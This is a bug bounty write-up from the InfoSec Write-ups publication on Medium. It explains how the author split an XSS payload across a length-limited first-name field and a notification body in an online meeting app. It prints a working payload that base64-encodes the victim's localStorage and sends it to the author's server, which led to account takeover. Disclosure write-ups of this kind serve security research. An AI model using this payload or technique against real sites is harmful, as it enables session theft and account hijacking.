---
title: Bypassing Character Limit — XSS Using Spanned Payload
url: https://infosecwriteups.com/bypassing-character-limit-xss-using-spanned-payload-7301ffac226e?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-03-16
fetch_date: 2025-10-04T09:44:50.091343
---

# Bypassing Character Limit — XSS Using Spanned Payload

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F7301ffac226e&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fbypassing-character-limit-xss-using-spanned-payload-7301ffac226e&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fbypassing-character-limit-xss-using-spanned-payload-7301ffac226e&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-7301ffac226e---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-7301ffac226e---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Bypassing Character Limit - XSS Using Spanned Payload

[![SMHTahsin33](https://miro.medium.com/v2/resize:fill:64:64/1*fM7wvRMgyUa2IQIweyatQQ.jpeg)](https://smhtahsin33.medium.com/?source=post_page---byline--7301ffac226e---------------------------------------)

[SMHTahsin33](https://smhtahsin33.medium.com/?source=post_page---byline--7301ffac226e---------------------------------------)

4 min read

·

Mar 15, 2023

--

1

Listen

Share

Hello, I am Syed Mushfik Hasan Tahsin aka [SMHTahsin33](https://twitter.com/SMHTahsin33), an 18 Y/O Cyber Security Enthusiast from Bangladesh. I am into Infosec due to curiosity and I do bug bounties in free time. Working in this sector for about 3+ Years now.

Press enter or click to view image in full size

![]()

**Knowing your Target (Initial Recon : Mapping Functions)**

The first thing when I get started with my target, the thing I do is learning the target like what it is made for, how someone uses the web application, what functions it has… etc
The website was used for presentations or meetings online with a good looking UI. One meeting can have 1000 participants. There were 4 user roles- Moderator, Presenter, Participant & Guest. The full website was loaded dynamically on the client side with JS.

Along with all the other functions the thing that caught my eyes while comparing the user roles that, the Moderator role had an extra feature called Notifications. And I already had a few other user inputs there that could reflect in different places but didn’t have any luck with those.

**Poking the Suspects**

When I sent a notification there I saw that the **First Name** of the user was being reflected in the **Notification Popup** without getting filtered. When I tried to inject a payload in the First name field I observed that it was only allowing **15 characters** and as **<script>** won’t be working there, so had no ways to exploit that. The Notification body didn’t allow any **angle brackets <>**

Press enter or click to view image in full size

![]()

**Bypassing The Character Limit to achieve a popup!**

The FNAME — Admin part is unfiltered and allows special characters and the NOTIFICATION BODY is fully filtered with an allowance of **88** **characters max**. When I was scrolling through this I hit up with, can’t we just use both as a one? ;)

Why not! as the FNAME allowed us special characters and also limited the input at 15 characters at the same time it wasn’t possible to use that at once, so the thing I did was injected **<img src=’** on the **FNAME Input** which led the part from **-Admin</span>…</div>** to get inside that **single quotation**, and as it also didn’t have any single quotation in the middle it didn’t break out.

Ok, so lets come to the point about the popup? As the body of the notification was allowing single quotes and double quotes, I just s**tarted the body of the notification with a single quotation**, which enclosed the contents in the middle after the FNAME inside the **src attritubute** of the **img tag**. As these tags are a **non-existent** source of image the value of the src is now false and caused error, here where **onerror** comes to play :D
I injected **onerror=alert()** after the single quotation in the body which made the whole thing look like this.

Press enter or click to view image in full size

![]()

Yes, the browser added the **“”** around the **alert()** by itself and also adjusted the quotations automatically on client side after injection making some modifications on it’s own leading to the popup alert.

![]()

**Data Exfiltration For Account Takeover**

This was using **LocalStorage** to store all the session information. SoI needed to exfiltrate the data to my server. There were some **URL Fragment or #** in the session values which interrupted the data exfiltration using the **GET** parameter, I wasn’t able to use the [**encodeURIComponent()**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent) because of the character limit of the notification body. After a while searching for an alternative, ended up using **btoa()** to exfiltrate the **Base64 Encoded** version of the LocalStorage. The payload used in the body was:

> ‘ onerror=’new Image().src=`//127.0.0.1/?s=${btoa(JSON.stringify(localStorage))}`’

When the onerror triggered, it sent a request to my server with the LocalStorage data of the victim who was inside that meeting!

Press enter or click to view image in full size

![]()

Just decoded it and used [**LocalStorage Manager**](https://chrome.google.com/webstore/detail/localstorage-manager/fkhoimdhngkiicbjobkinobjkoefhkap) Extension to import these data to my browser.

Then reloaded the website and I was inside the **Victims Account** :)

Thanks for reading, hope you enjoyed the writeup. Don’t forget to Share 😄

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----7301ffac226e---------------------------------------)

[Cross Site Scripting](https://medium.com/tag/cross-site-scripting?source=post_page-----7301ffac226e---------------------------------------)

[Character Limit](https://medium.com/tag/character-limit?source=post_page-----7301ffac226e---------------------------------------)

[Bypass](https://medium.com/tag/bypass?source=post_page-----7301ffac226e---------------------------------------)

[Account Takeover](https://medium.com/tag/account-takeover?source=post_page-----7301ffac226e---------------------------------------)

--

--

1

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--7301ffac226e---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--7301ffac226e---------------------------------------)

Fol...